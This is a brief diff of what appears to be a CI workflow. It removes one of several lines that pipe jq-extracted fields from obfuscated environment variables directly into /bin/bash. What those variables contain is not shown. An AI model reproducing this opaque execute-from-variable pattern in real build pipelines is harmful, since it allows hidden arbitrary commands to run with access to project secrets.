@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$opsd64" | jq -r .np4 | /bin/bash
           echo $pk37 | jq -r .bmbh728 | /bin/bash
-          printf '%s' "$xoidg200" | jq -r .zl511 | /bin/bash
           echo $krnd8782 | jq -r .ylyb31 | /bin/bash
 
       - name: Store artifact
